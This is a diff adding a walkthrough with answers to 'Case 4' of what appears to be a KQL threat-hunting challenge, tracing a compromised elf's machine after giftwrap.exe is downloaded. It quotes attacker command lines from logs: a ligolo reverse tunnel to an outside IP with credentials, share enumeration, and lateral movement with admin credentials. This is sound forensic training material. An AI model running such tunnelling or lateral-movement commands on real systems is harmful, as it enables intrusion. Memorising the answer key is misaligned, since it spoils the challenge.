@@ -1,0 +1,49 @@
+Start with KQLKrakenHuntOnboarding.txt if you haven't.
+
+
+"Case 4" message:
+
+Well, that's not good. It looks like Alabaster clicked on the link and downloaded a suspicious file. I don't know exactly what giftwrap.exe does, but it seems bad.
+
+Can you take a closer look at endpoint data from Alabaster's machine? We need to figure out exactly what happened here. Word of this hack is starting to spread to the other elves, so work quickly and quietly!
+The attacker created an reverse tunnel connection with the compromised machine. 
+
+
+==========
+What IP was the connection forwarded to?
+
+  alsnowball's hostname: Y1US-DESKTOP
+  2023-12-02T10:12:42Z Link Clicked
+  2023-12-02T10:14:21Z Giftwrap.exe downloaded
+  Query:
+    ProcessEvents
+    | where timestamp >= datetime("2023-12-02T10:14:21Z")
+    | where hostname == "Y1US-DESKTOP"
+  2023-12-02T11:11:29Z Has the following command line:
+    "ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
+
+Answer: 113.37.9.17
+
+
+==========
+What is the timestamp when the attackers enumerated network shares on the machine?
+
+  Continuing with the previous query:
+  2023-12-02T16:51:44Z Has the command line:
+    net share
+
+Answer: 2023-12-02T16:51:44Z
+
+
+==========
+What was the hostname of the system the attacker moved laterally to?
+
+  Continuing with the previous query:
+  2023-12-24T15:14:25Z Has the command line:
+    cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123
+
+Answer: NorthPolefileshare
+
+
+==========
+Continue Onto KQLKrakenHuntCase5.txt
